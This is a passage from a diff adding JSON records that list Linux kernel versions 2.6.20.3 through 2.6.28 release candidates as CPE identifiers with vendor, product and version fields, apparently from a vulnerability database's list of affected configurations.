+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.18:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.19:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.19"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.20.21:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.20.21"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.21.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.21.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.18:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.19:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.19"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.21:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.21"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.22.22:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.22.22"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.23.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.23.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.24.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.24.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.13:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.13"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.14:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.14"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.15:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.15"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.16:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.16"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.17:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.17"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.18:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.18"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.19:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.19"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.25.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.25.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.26.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.26.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc1:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc2:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc3:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc4:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc5:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc6:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc8:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27:rc9:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.12:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.12"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.20:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.20"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.22:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.22"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.23:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.23"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.24:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.24"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.33:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.33"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.34:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.34"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.35:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.35"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.36:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.36"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.27.37:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.27.37"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:git7:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.28"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.28:rc1:*:*:*:*:*:*",
